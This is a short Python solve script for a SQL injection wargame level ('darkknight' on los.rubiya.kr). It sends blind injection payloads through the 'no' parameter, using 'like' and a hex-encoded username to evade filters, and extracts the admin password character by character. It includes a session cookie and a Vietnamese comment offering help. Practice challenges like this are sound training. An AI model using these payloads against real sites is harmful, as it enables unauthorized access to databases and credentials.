import requests
cookies={"PHPSESSID":"s1v411n37ev0ot5ra291moeav0"}
url='https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
a='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy'
for i in a:
 # params={"pw":"-1","no":'-1 or id like 0x61646d696e and length(pw) like '+str(i)} find length
 params={"pw":"-1","no":'-1 or id like 0x61646d696e and pw like "0B70EA1F'+str(i)+'%"'}
 r=requests.get(url,params=params,cookies=cookies)
 print(r.text.split("<strong>")[1].split("<code>")[0])
  # ko hiểu chỗ nào thì hỏi nhá :V
